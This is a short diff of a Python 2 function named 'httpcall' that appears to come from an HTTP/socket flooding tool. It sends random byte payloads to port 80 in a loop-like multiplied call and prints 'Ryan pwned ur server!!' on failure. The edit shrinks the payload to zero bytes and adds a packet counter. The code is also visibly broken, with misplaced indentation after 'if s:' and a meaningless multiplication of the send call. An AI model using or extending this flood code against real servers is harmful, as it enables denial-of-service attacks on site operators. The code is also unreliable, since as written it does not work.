@@ -80,13 +80,16 @@ def httpcall(url):
 	referer_list()
 	code=0
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	bytes = random._urandom(1490)
+	bytes = random._urandom(0)
+	pkt_count = 0
 	try:
+		if s:
 		
 			s.sendto(bytes, (url, 80)) * 109951162777600
 			s.settimeout(10)
+			pkt_count += 3
 			
-	except:
+	except Exception:
 			#print e.code
 			print 'Ryan pwned ur server!!'
 			code=500
